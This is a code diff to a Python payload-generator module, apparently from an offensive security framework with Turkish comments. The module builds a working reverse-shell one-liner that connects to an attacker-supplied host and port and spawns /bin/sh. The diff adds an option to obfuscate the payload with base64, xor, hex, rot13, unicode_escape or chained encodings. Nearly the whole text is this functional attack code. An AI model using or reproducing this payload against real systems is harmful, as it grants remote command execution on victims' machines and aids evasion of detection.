@@ -17,6 +17,7 @@ class Payload(BaseModule):
         self.Options = {
             "LHOST": Option("LHOST", "127.0.0.1", True, "Bağlanılacak IP (Saldırgan)."),
             "LPORT": Option("LPORT", 4444, True, "Bağlanılacak Port."),
+            "ENCODE": Option("ENCODE", "None", False, "Payload'ı encode et (base64, xor, hex, rot13, unicode_escape veya zincir)."),
             "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet (örn: /tmp/shell.py).", completion_dir=".")
         }
 
@@ -26,7 +27,7 @@ class Payload(BaseModule):
         lport = self.get_option_value("LPORT")
 
         # Python one-liner reverse shell
-        payload = f"""
+        raw_payload = f"""
 import socket,os,subprocess
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("{lhost}",{lport}))
@@ -35,7 +36,9 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 subprocess.call(["/bin/sh","-i"])
 """
-        return payload.strip()
+        encode_type = self.get_option_value("ENCODE")
+        from core.encoders.manager import apply_encoding
+        return apply_encoding(raw_payload.strip(), encode_type)
 
     def run(self, options: Dict[str, Any]):
         """Payload oluştur ve ekrana bas/kaydet."""
